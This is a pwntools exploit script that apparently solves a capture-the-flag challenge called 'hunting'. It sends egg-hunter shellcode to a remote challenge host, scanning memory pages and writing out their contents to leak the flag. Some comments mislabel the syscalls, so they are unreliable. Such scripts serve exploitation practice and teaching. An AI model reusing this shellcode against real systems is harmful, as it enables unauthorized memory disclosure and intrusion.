#!/usr/bin/env python3

from pwn import *

exe = ELF("./hunting")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DDEBUG:
            gdb.attach(r)
    else:
        r = remote("83.136.251.235", 40507)

    return r


def main():
    r = conn()

    # EBX and ECX are 1st and 2nd args
    payload = asm("""
            push 0x0;
            mov ebx, 0x60000000;
            push ebx;

            // Increases address
            pop ebx;
            add ebx, 0x1000;
            push ebx;

            // Loads the content at that address
            lea edi, dword ptr[ebx];

            // Calls sys_read
            mov eax, 0x4;
            mov ebx, 0x1;
            mov ecx, edi;
            mov edx, 0x24;
            int 0x80;

            // Tests whether it was readable or not (of not $eax = -1)
            test eax, eax;
            jl $-0x1f;

            // Clean exit
            mov eax, 0x1;
            mov ebx, 0x0;
            syscall;
        """)

    r.send(payload)
    log.success(f"Flag obtained: {r.recvuntilS('}', drop = False)}")


if __name__ == "__main__":
    main()
